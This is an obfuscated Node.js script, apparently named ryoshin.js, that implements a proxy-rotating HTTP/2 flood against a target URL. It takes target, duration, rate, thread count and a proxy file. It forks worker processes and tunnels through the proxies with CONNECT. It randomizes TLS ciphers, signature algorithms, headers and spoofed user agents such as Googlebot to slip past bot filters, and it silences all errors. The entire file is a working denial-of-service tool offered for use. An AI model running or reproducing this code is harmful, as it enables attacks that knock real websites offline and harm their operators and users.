const _0x1368c8 = require("net");
const _0x4a46f2 = require("http2");
const _0x558a89 = require("tls");
const _0x4f18d0 = require("cluster");
const _0x291acc = require("url");
const _0x1833d6 = require("user-agents");
const _0x14235a = require('fs');
const {
  HeaderGenerator: _0x146aae
} = require("header-generator");
_0x558a89.DEFAULT_ECDH_CURVE;
process.setMaxListeners(0);
function _0x4243ed(_0x189db7, _0x4a2a84, _0x3d80d5, _0x48f257, _0x5583e6) {
  return _0x5329(_0x5583e6 - 0x3c4, _0x3d80d5);
}
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", function (_0x31acc5) {});
if (process.argv.length < 7) {
  console.log("Usage: node ryoshin.js target time rate thread proxyfile");
  process.exit();
}
const _0x3a4acd = {};
function _0x4a0c1c(_0x3536b2) {
  return _0x14235a.readFileSync(_0x3536b2, "utf-8").toString().split(/\r?\n/);
}
function _0xc7c806(_0x4f4419, _0x6e1c4b) {
  return Math.floor(Math.random() * (_0x6e1c4b - _0x4f4419) + _0x4f4419);
}
function _0x2020() {
  const _0x345b3 = ['KXdpp', 'asure', 'oogle', '1657050uDKXym', 'qgSrJ', 'Diqqi', 'vfIro', '//hel', 'BSuaS', 'UPTko', 'follo', 'close', '128-G', 'ucuKY', 'image', '256v1', 'Misry', 'targe', 'wmLJy', '_sha3', 'cache', 'OtIta', '=0.9,', 'GH:ME', 'guage', ", fr;", 'conso', '-RSA-', "; rv:", 'secur', 'Ciphe', '6-GCM', ':MEDI', 'o.com', 'x-req', 'yTZAP', 'yQTCE', "1.1\r\n", 'ch?q=', 'sjcHu', 'NGKAC', 'se.or', 'maxCo', 'meout', 'AnAYT', '6-SHA', 'retur', 'EDIUM', 'nctio', "ive\r\n", '603BMwwnY', 'respo', 'e/apn', '256r1', 'jklmn', 'maxDe', 'RkTLL', '37984rxHDFf', 'initi', '8-GCM', 'searc', 'LPGfs', 'zed', 'argv', 'yFAmv', '0.5', 'keywo', 'LlYia', 'PvHvA', 'fork', 'const', ".36 (", 'defla', "nux; ", "nse f", 'ml+xm', 'n/xht', 'lnLpY', 'Jndma', 'Kfzki', 'eKdwO', '=0.5', 'edire', '56:HI', 'd-wit', 'XMLHt', 'i/537', 'ALPNP', 'Liste', 'WcDvJ', 'charA', 'nHjGr', 'PyckQ', 'svn.s', 'tp://', 'ExbCT', '+http', 'onTim', 'timeo', 'hvqEy', 'dZAvY', 'time', 'Dynam', 'pleWe', '://ww', 'mrBHz', 'LGgJH', 'tEIkW', 'NaTYh', "\"retu", 'UVWXY', 'noBjt', "rom p", 't.htm', "nux x", ": inv", 'MEDIU', 'yuIJC', 'LFRWq', 'nalhi', '-SHA2', 'KeVwr', 'de-in', 'hGJIY', 'thori', 'bot.h', 'QnwuL', 'tzoor', 'ystem', 'www.c', 'AES12', ": tim", 'ry=&q', '=0.9', 'efghi', "eout ", 'ileSy', 'ion/s', 'ANmxm', ':3DES', '?v=', '?=que', 'data', 'uild/', 'kkQfC', 'HAttU', 'RiYSD', " 5X B", ')+)+)', 'ebot/', 'hrExs', 'klUrz', 'vOtZB', 'hTOkX', 'enHEx', 'ment/', 'YgEUl', 'hp)', 'LJsFD', 'otRhb', 'ECDHE', "0 (co", "te, g", '5.php', 'ry=1&', ':path', 'rNUeX', ',*/*;', '{}.co', 'VbwuL', 'query', 'proxy', '-SHA3', '7498410TkbvhF', "zip, ", "te th", 'ghtEx', 'A-AES', 'krmtI', 'ncurr', 'de-CH', 'FFbQx', "; +ht", 'HTTP', 'file', 'rsion', 'cs;q=', 'exit', 'Hwxky', 'accep', 'OSlVB', 'ookex', 'Usage', 'LDNxW', 'cnqlD', '8-SHA', 'OwLKa', 'ome/1', 'lRjLG', 'aQeSb', '53298DMgqsZ', 'des', 'setMa', 'pZiiU', '=b3', " targ", 'ABCDE', 'apply', 'ROhce', '_sha2', 'Inter', 'webp,', 'tion', 'q=0.7', 'eQUHZ', 'Host:', "1.0; ", 'rotoc', 'icati', 'WXByK', 'ers', 'ch.ao', 'ners', 'HIGH:', 'ckcVN', "0 (X1", 'tUnau', 'rando', 'jyMPM', 'YfVfd', 'ctor(', 'kdDzs', 'bKit/', 'UXFtg', 'bjLbE', 'r-gen', '34567', '311145XGKErc', 'edJyc', 'kHrNM', 'sha51', 'om/se', 'PQRST', "1; Li", 'compa', '12.0.', 'adget', 'et-me', 'l.com', 'port', '_secp', 'yPUVg', 't-enc', 'ecdhC', 'g/cgi', 'bHIoF', 'Emitt', 'odkkz', 'ext.p', 'www.g', '/wow/', "bile ", 'jrYjC', 'UkoQv', 'CgjWx', 'Cpane', 'creat', 'RjLUj', 'LT_EC', 'split', '-exch', 'yKObL', 'oding', 'ehGQV', 'OdAfd', '10524yyasTW', 'ntern', '//eng', 'dXnvM', '1.1', 'quHUE', 'u.que', 'end', 'http2', '?q=', '4lvbfLP', 'ae_sh', '//fun', 'gi/', 'gsnvM', 'XhzJB', 'battl', 'q=?ab', 'omee.', 't/2.1', 'VWGIL', '3DES', "0 (Li", "et ti", 'xScXl', 'Event', 'aderL', 'DseWk', '/*;q=', 'ange;', '(((.+', '.sear', 'dKvtC', 'Gecko', 'clZQn', 'EGKzD', 'eout', 'HGjCx', 'nrRzY', 'dowSi', 'ePush', " Geck", 'istSi', 'catio', 'fr-CH', 'com/f', 'max-a', 'JtGnO', 'rOrde', 'Safar', 'QYdqp', 'tls', 'honor', 'DSAVS', 'he-IL', 'curl/', '//eu.', 'ONfyO', 'FhqUt', 'ectio', 'rTabl', 'http/', 'faceb', 'socke', 'glebo', 'FHoLX', ';q=0.', 'A384:', 'html,', '00101', 'P-Cli', 'GsIuE', '7.58.', 'ru=1&', 'fake-', 'dmDiY', "like ", 'setTi', 'heade', 'MMB29', 'OD.js', '8,en;', 'FFsBR', 'RVE', 'licat', 'avif,', 'user-', '_2_me', 'event', 'UnoMu', 'DVkpc', 'HTTP/', 'uests', 'VCpQP', 'w.fac', 'a256', 'aLVvm', 'ecdsa', 'maxHe', 'NnKxC', 'href', 'utf-8', 'WZYje', 'gle.c', 'nymam', ':secp', '0.9,i', 'flate', ": nod", 'AIwga', 'serve', 'ZayLh', 'HfEVg', 'no-ca', 'https', 'hQija', 'trace', ',imag', 'MDhAO', 'Nexus', 'setKe', '_sha5', 'parse', 'A256:', 'jybXJ', 'sult?', 'ment.', 'rejec', "1.1 2", '?true', "id 6.", 'a384', 'cWami', 'M:3DE', 'c.r/', 'q=0.9', 'en/se', 'destr', 'KTFDE', "CT ", 'ter', 'ructo', 'url', '__pro', '0.8', 'Googl', 'PwQtb', 's://i', 'GuWxM', 'net', 'gent', 'ZuItY', 'defau', 'nstru', 'ciphe', 'cepti', 'l-HTT', 'tml)', 'ent/1', 'rds=', "n() ", 'text/', 'CM-SH', 'URrWm', 'fhKOv', 'com/)', 'KFCZp', 'zGRGy', "n: Ke", '//ddo', 'lengt', 'BktwI', 'KLMNO', 'nIRoR', 'error', 'devic', 'HibUC', 'o/201', 'MguPA', 'ssion', 'Vdico', 'WBRyS', 'and', 'en-US', 'sha25', 'eEzOa', 'hUoTm', 'clust', '3.0', 'a512', '_3_me', '/sear', ':443', "TML, ", 'bIcJe', '-bin/', 'excha', 'sha38', '553985eixESa', 'ru/se', 'uoNzV', 'leSiz', "6 (KH", 'eProt', 'du.co', 'P-FLO', 'crypt', 'w.goo', 'Mozil', ':HIGH', 'pragm', 'WBmXd', 'ZtqnB', 'igned', 'SDVZb', 'fLtys', 'IvpuM', 'kcs1_', 'lzJXJ', 'anon-', ", en;", 'to__', 'IfBGe', "is\")(", 'usera', 'pDJgm', "; Goo", "49 Mo", ',appl', 'vwoyz', "1.1 (", 'FGHIJ', 'vjUVb', ":443\r", 't-lan', '?s=', 'toStr', 'ZcOrX', 'DWgeM', 'itPgf', 'uWkzV', 'from', 'IGH:M', ':auth', 'rname', 'opera', 'OVrZo', 'wAllR', '384r1', 'bind', 'nymou', '256:H', 'prime', ':sche', 'gay.r', 'agent', 'UM:3D', 'inclu', '-cont', 'e.net', 'RuZmp', 'lhit/', 'rsa_p', 'LykXp', 'table', 'tpReq', 'col', 't_uat', 'File', " Fire", 'ueste', 'a.com', 'UQpFs', 'TrfVH', 'v=b3;', 'terna', 'SKEaa', 'cnUMJ', 'FEzjC', 'DEFAU', 'UXgeG', 'p.bai', 'kFMsf', '384:H', 'maxVe', 'write', '8,app', 'Zuhsi', '//coc', 'GbhQz', 'brows', 'addre', 'ebook', 'HBYZD', 'IsySg', 'Rate', 'KCOnh', 'uSQry', '//ano', 'fox/8', 'httpV', '84:HI', 'reque', '/webp', 'icTab', 'excep', 'netMe', 'ep-Al', 'windo', ',en;q', 'Memor', '521r1', 'fRDum', 'ing', 'UWRox', 'wQoXN', 'che', 'erato', "roxy ", 'ded', 'rchRe', 'ojeql', 'YGTdN', 'name', 'deskt', "0.1; ", 'm/sea', '/apng', 'DIUM:', ", de;", 'threa', 'hTlUg', 'arch#', 'ngs', 'ehipp', '0.9,*', 'AES25', 'thod', '//fil', 'upgra', "read ", 'edhOR', 'tuvwx', ":443 ", 'sessi', 'KFcsR', 'iOvFp', 'ersio', 'YhRuP', 'iNsOS', 'opqrs', 'setti', 'type', 'GET', ", *;q", ") Chr", 'mail.', 'aders', 'cts', 'coc.c', 'nge;v', 'origi', "me ra", '22KivpeL', 'gzip', 'minVe', 'mpati', 'n-gb;', 'Mkagq', 'jxcSS', 'log', 'bExdu', 'aLXID', 'chrom', "\nConn", 'ols', 'ltMax', 'entSt', 'mage/', 'CONNE', '86_64', 'appli', 'xOCvO', 'Hnvnt', 'uncau', 'xyyIO', '//go.', 'excee', 'LYucL', 'DH_CU', 'jpcnM', 'SEtdP', 'IKCkn', 'arch?', 'conne', 'readF', 'http:', '5615.', 'rol', 'tKZow', "rn th", 'om/bo', 'ss_rs', "da, e", "P) Ap", 'ocol', 'MKdmX', 'uest', '83.0)', 'lssHD', 'EZUxc', 'ion/x', 'exter', 'kRMKY', 'RiswP', 'eConn', '537.3', 'l,app', 'local', 'sbKZk', 'Andro', ',he;q', 'PkAtN', "e HTT", 'Zabcd', 'nse', 'PLdBy', 'ARbrJ', '256-G', 'AKLhg', 'qAnwv', 'PrGjW', 'IWLht', 'FNCgo', 'c.r&q', 'q=0.8', 'CrFet', 'tiXkH', "2.1; ", 'yz012', 'reams', 'maxSe', '.com/', 'wVPRZ', "ble; ", 'path', 'sigal', '_1_me', 'ml;q=', 'la/5.', 'luvdv', 'proto', 'mlxBR', 'xList', 'ority', 'IwASl', 'isMas', 'TLSv1', 'oiQdL', "n (fu", 'zZtdm', 'gned-', 'PyCyI', ':meth', 'e-req', 'fIpGK', "alid ", 'ODdXQ', 'eSize', 'enabl', 'EGifn', 'host', 'urve', 'tingS', 'ge=0', 'mRzvN', '-ECDS', 'apEOe', 'Uiypr', 'tTDzW', 'hCskp', 'warn', 'tible', 'HLZlo', 'info', 'epAli', 'floor', 'eners', '160fmCgTj', 'alWin', 'on/si', 'getHe', 'g,*/*'];
  _0x2020 = function () {
    return _0x345b3;
  };
  return _0x2020();
}
function _0x230d2f(_0x20b01a) {
  return _0x20b01a[Math.floor(Math.random() * (_0x20b01a.length - 0) + 0)];
}
function _0x4c4cc1(_0x322a03) {
  var _0x4c7363 = '';
  var _0x1660fd = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length;
  for (var _0x336671 = 0; _0x336671 < _0x322a03; _0x336671++) {
    _0x4c7363 += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * _0x1660fd));
  }
  ;
  return _0x4c7363;
}
const _0x335123 = () => {
  return Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
};
const _0x1359c5 = Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
const _0x1a071b = {};
function _0x1708c7(_0x4aaafc, _0x110fa8, _0x1ad2da, _0x256ad5, _0x1be64b) {
  return _0x5329(_0x1ad2da + 0x284, _0x4aaafc);
}
_0x1a071b.target = process.argv[2];
_0x1a071b.time = ~~process.argv[3];
_0x1a071b.Rate = ~~process.argv[4];
_0x1a071b.threads = ~~process.argv[5];
_0x1a071b.proxyFile = process.argv[6];
const _0x192158 = _0x1a071b;
const _0x2b98d1 = {
  name: "chrome",
  minVersion: 0x50,
  maxVersion: 0x6b,
  httpVersion: '2'
};
const _0x120341 = {
  browsers: [_0x2b98d1],
  devices: ["desktop"],
  operatingSystems: ["windows"]
};
function _0x89b980(_0x2c6d52, _0xd6622, _0x527d63, _0x9d61a0, _0x413aac) {
  return _0x5329(_0x9d61a0 + 0x1bb, _0x527d63);
}
function _0x889fb8(_0x32db10, _0x5aaca1, _0x47aa45, _0x35a7c8, _0x4bed33) {
  return _0x5329(_0x4bed33 - 0x26f, _0x35a7c8);
}
_0x120341.locales = ["en-US", 'en'];
let _0x54e912 = new _0x146aae(_0x120341);
let _0x300457 = _0x54e912.getHeaders();
const _0x1b2eb2 = ["ecdsa_secp256r1_sha256", "ecdsa_secp384r1_sha384", "ecdsa_secp521r1_sha512", "rsa_pss_rsae_sha256", "rsa_pss_rsae_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha256", "rsa_pkcs1_sha384", "rsa_pkcs1_sha512"];
const _0x105cd7 = ["ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES", "ECDHE-RSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES", "ECDHE-RSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES", "ECDHE-RSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES", "ECDHE-RSA-AES128-SHA256:HIGH:MEDIUM:3DES", "ECDHE-RSA-AES128-SHA:HIGH:MEDIUM:3DES", "ECDHE-RSA-AES256-SHA384:HIGH:MEDIUM:3DES", "ECDHE-RSA-AES256-SHA:HIGH:MEDIUM:3DES", "ECDHE-RSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES"];
const _0x8e7fb4 = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"];
const _0x54b8fb = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", "en-US,en;q=0.9", "de-CH;q=0.7", "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5"];
const _0x3f9295 = ["deflate, gzip, br", "gzip", "deflate", 'br'];
const _0x476864 = ["no-cache", "max-age=0"];
const _0x2bbf9a = ["http://anonymouse.org/cgi-bin/anon-www.cgi/", "http://coccoc.com/search#query=", "http://ddosvn.somee.com/f5.php?v=", "http://engadget.search.aol.com/search?q=", "http://engadget.search.aol.com/search?q=query?=query=&q=", "http://eu.battle.net/wow/en/search?q=", "http://filehippo.com/search?q=", "http://funnymama.com/search?q=", "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=", "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/", "http://go.mail.ru/search?mail.ru=1&q=", "http://help.baidu.com/searchResult?keywords="];
const _0x39e9e1 = ['', '&', '', '&&', "and", '=', '+', '?'];
const _0x54b25f = ["?s=", '/?', "?q=", "?true=", '?'];
const _0x306c70 = ["Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0", "Cpanel-HTTP-Client/1.0", "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)", "curl/7.58.0", "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"];
var _0x17fa8f = _0x105cd7[Math.floor(Math.floor(Math.random() * _0x105cd7.length))];
var _0x49b3af = _0x1b2eb2[Math.floor(Math.floor(Math.random() * _0x1b2eb2.length))];
var _0x10ed52 = _0x306c70[Math.floor(Math.floor(Math.random() * _0x306c70.length))];
var _0x9211fd = _0x39e9e1[Math.floor(Math.random() * _0x39e9e1.length)];
var _0x251f03 = _0x54b25f[Math.floor(Math.random() * _0x54b25f.length)];
var _0x3ce448 = _0x2bbf9a[Math.floor(Math.floor(Math.random() * _0x2bbf9a.length))];
var _0x56e18e = _0x8e7fb4[Math.floor(Math.floor(Math.random() * _0x8e7fb4.length))];
var _0x2da9a6 = _0x54b8fb[Math.floor(Math.floor(Math.random() * _0x54b8fb.length))];
var _0xf462aa = _0x3f9295[Math.floor(Math.floor(Math.random() * _0x3f9295.length))];
var _0x1c5d10 = _0x476864[Math.floor(Math.floor(Math.random() * _0x476864.length))];
var _0x29270a = _0x14235a.readFileSync(_0x1a071b.proxyFile, "utf-8").toString().split(/\r?\n/);
const _0x25f99b = _0x291acc.parse(_0x1a071b.target);
if (_0x4f18d0.isMaster) {
  for (let _0x2ccc5a = 1; _0x2ccc5a <= _0x1a071b.threads; _0x2ccc5a++) {
    _0x4f18d0.fork();
  }
} else {
  setInterval(_0x2d7fce);
}
class _0x39250d {
  constructor() {}
  ["HTTP"](_0x5156a8, _0x1617f1) {
    const _0x181c24 = "CONNECT " + _0x5156a8.address + ":443 HTTP/1.1\r\nHost: " + _0x5156a8.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x98fcbf = new Buffer.from(_0x181c24);
    const _0xc3eebf = {
      host: _0x5156a8.host
    };
    _0xc3eebf.port = _0x5156a8.port;
    const _0x3f3c36 = _0x1368c8.connect(_0xc3eebf);
    _0x3f3c36.setTimeout(_0x5156a8.timeout * 10000);
    _0x3f3c36.setKeepAlive(true, 100000);
    _0x3f3c36.on("connect", () => {
      _0x3f3c36.write(_0x98fcbf);
    });
    _0x3f3c36.on("data", _0x15f499 => {
      const _0x4ef063 = _0x15f499.toString("utf-8");
      const _0x5c2cc0 = _0x4ef063.includes("HTTP/1.1 200");
      if (_0x5c2cc0 === false) {
        _0x3f3c36.destroy();
        return _0x1617f1(undefined, "error: invalid response from proxy server");
      }
      return _0x1617f1(_0x3f3c36, undefined);
    });
    _0x3f3c36.on("timeout", () => {
      _0x3f3c36.destroy();
      return _0x1617f1(undefined, "error: timeout exceeded");
    });
    _0x3f3c36.on("error", _0x283369 => {
      _0x3f3c36.destroy();
      return _0x1617f1(undefined, "error: " + _0x283369);
    });
  }
}
const _0x59f545 = new _0x39250d();
_0x3a4acd[":method"] = "GET";
_0x3a4acd[":path"] = _0x25f99b.path;
_0x3a4acd.origin = _0x25f99b.host;
_0x3a4acd[":scheme"] = "https";
_0x3a4acd.accept = _0x56e18e;
_0x3a4acd["accept-language"] = _0x2da9a6;
_0x3a4acd["accept-encoding"] = _0xf462aa;
_0x3a4acd["cache-control"] = _0x1c5d10;
_0x3a4acd["upgrade-insecure-requests"] = '1';
_0x3a4acd["x-requested-with"] = "XMLHttpRequest";
_0x3a4acd.pragma = "no-cache";
function _0x2d7fce() {
  const _0xe59c55 = _0x29270a[Math.floor(Math.random() * (_0x29270a.length - 0) + 0)];
  const _0xab4717 = _0xe59c55.split(':');
  _0x3a4acd[":authority"] = _0x25f99b.host;
  _0x3a4acd["user-agent"] = _0x10ed52;
  const _0x45ffc7 = {
    'host': _0xab4717[0],
    'port': ~~_0xab4717[1],
    'address': _0x25f99b.host + ":443",
    'timeout': 0xa
  };
  _0x59f545.HTTP(_0x45ffc7, (_0x456a2d, _0x3f82a2) => {
    if (_0x3f82a2) {
      return;
    }
    _0x456a2d.setKeepAlive(true, 600000);
    const _0x1504b9 = {
      host: _0x25f99b.host,
      port: 0x1bb,
      ALPNProtocols: ["http/1.1", 'h2'],
      followAllRedirects: true,
      ecdhCurve: "prime256v1:secp384r1:secp521r1",
      ciphers: _0x17fa8f,
      secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"],
      sigals: _0x49b3af,
      rejectUnauthorized: false,
      socket: _0x456a2d,
      honorCipherOrder: true,
      secure: true,
      servername: _0x25f99b.host,
      sessionTimeout: 0x1388
    };
    const _0x1937bb = _0x558a89.connect(443, _0x25f99b.host, _0x1504b9);
    _0x1937bb.setKeepAlive(true, 100000);
    const _0xfe026a = {
      headerTableSize: 0x10000,
      maxConcurrentStreams: 0x61a8,
      initialWindowSize: 0x600000,
      maxHeaderListSize: 0x40000,
      enablePush: false
    };
    const _0x471d23 = {
      protocol: "https:",
      settings: _0xfe026a,
      maxSessionMemory: 0xd05,
      maxDeflateDynamicTableSize: 0xffffffff,
      createConnection: () => _0x1937bb,
      socket: _0x456a2d
    };
    const _0xf09de8 = _0x4a46f2.connect(_0x25f99b.href, _0x471d23);
    const _0x5c3afc = {
      headerTableSize: 0x10000,
      maxConcurrentStreams: 0x61a8,
      initialWindowSize: 0x600000,
      maxHeaderListSize: 0x40000,
      enablePush: false
    };
    _0xf09de8.settings(_0x5c3afc);
    _0xf09de8.on("connect", () => {});
    _0xf09de8.on("close", () => {
      _0xf09de8.destroy();
      _0x456a2d.destroy();
      return;
    });
    _0xf09de8.on("error", _0x14e519 => {
      _0xf09de8.destroy();
      _0x456a2d.destroy();
      return;
    });
  });
}
const _0x36399d = () => process.exit(1);
function _0x5329(_0x17b93d, _0x120244) {
  const _0x238138 = _0x2020();
  _0x5329 = function (_0x3648e, _0x20208c) {
    _0x3648e = _0x3648e - 148;
    let _0x53298e = _0x238138[_0x3648e];
    return _0x53298e;
  };
  return _0x5329(_0x17b93d, _0x120244);
}
setTimeout(_0x36399d, _0x1a071b.time * 1000);